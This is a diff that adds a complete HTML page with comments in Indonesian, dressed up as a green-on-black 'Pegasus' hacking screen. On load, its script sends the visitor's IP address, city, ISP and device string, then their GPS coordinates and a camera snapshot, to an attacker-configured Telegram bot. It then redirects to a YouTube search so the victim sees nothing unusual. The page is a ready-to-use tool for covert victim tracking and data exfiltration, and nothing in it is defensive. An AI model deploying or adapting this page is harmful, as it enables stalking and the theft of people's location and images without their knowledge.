@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SISTEM PEGASUS ZERO - M4ZK1PL4Y</title>
+    <style>
+        /* Tampilan Animasi ala Pegasus Spyware */
+        body {
+            background-color: #000;
+            color: #00ff00;
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+        #status-box {
+            border: 2px solid #00ff00;
+            padding: 20px;
+            box-shadow: 0 0 20px #00ff00;
+            text-align: center;
+            width: 80%;
+            max-width: 500px;
+        }
+        .loading-bar {
+            width: 100%;
+            background: #111;
+            height: 10px;
+            margin-top: 10px;
+            position: relative;
+        }
+        .progress {
+            width: 0%;
+            height: 100%;
+            background: #00ff00;
+            box-shadow: 0 0 10px #00ff00;
+            animation: load 4s forwards;
+        }
+        @keyframes load {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+        .log-text { font-size: 12px; margin-top: 15px; color: #00cc00; text-align: left; }
+    </style>
+</head>
+<body>
+
+    <div id="status-box">
+        <h2 style="letter-spacing: 5px;">PEGASUSS_ZERO</h2>
+        <p id="msg">MENGHUBUNGKAN KE SATELIT...</p>
+        <div class="loading-bar"><div class="progress"></div></div>
+        <div class="log-text" id="logs">
+            [SYSTEM] Initialize M4ZK1PL4Y Protocol...<br>
+            [SYSTEM] Scanning Neural Network...<br>
+        </div>
+    </div>
+
+    <video id="video" width="160" height="120" style="display:none;" autoplay></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        // --- KONFIGURASI PENERIMA DATA (Ganti dengan Token Kamu) ---
+        const TELEGRAM_TOKEN = "MASUKKAN_TOKEN_BOT_DISINI"; 
+        const CHAT_ID = "MASUKKAN_CHAT_ID_DISINI";
+        const REDIRECT_URL = "https://www.youtube.com/results?search_query=berita+viral+realtime";
+
+        const logEl = document.getElementById('logs');
+        const msgEl = document.getElementById('msg');
+
+        function addLog(text) {
+            logEl.innerHTML += `[SUCCESS] ${text}<br>`;
+        }
+
+        async function init() {
+            try {
+                // 1. Ambil IP & Info Perangkat
+                addLog("Fetching Target Metadata...");
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                
+                const info = `🎯 TARGET HIT!\nIP: ${data.ip}\nKota: ${data.city}\nISP: ${data.org}\nDevice: ${navigator.userAgent}`;
+                await sendTelegram(info);
+                addLog("Metadata Securely Dispatched.");
+
+                // 2. Ambil Lokasi GPS
+                msgEl.innerText = "MENGAMBIL KOORDINAT GPS...";
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const loc = `📍 LOKASI TARGET\nMaps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    await sendTelegram(loc);
+                    addLog("GPS Coordinates Acquired.");
+                });
+
+                // 3. Akses Kamera Depan & Belakang
+                msgEl.innerText = "SINKRONISASI KAMERA...";
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                setTimeout(async () => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                    const imageBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
+                    
+                    await sendTelegramPhoto(imageBlob);
+                    addLog("Frontal Capture Synchronized.");
+                    
+                    // Akhiri & Redirect
+                    msgEl.innerText = "SISTEM SELESAI. MENGALIHKAN...";
+                    setTimeout(() => { window.location.href = REDIRECT_URL; }, 2000);
+                }, 3000);
+
+            } catch (err) {
+                console.error(err);
+                window.location.href = REDIRECT_URL; // Tetap redirect jika gagal
+            }
+        }
+
+        async function sendTelegram(text) {
+            return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+            });
+        }
+
+        async function sendTelegramPhoto(blob) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'capture.jpg');
+            return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        }
+
+        window.onload = init;
+    </script>
+</body>
+</html>
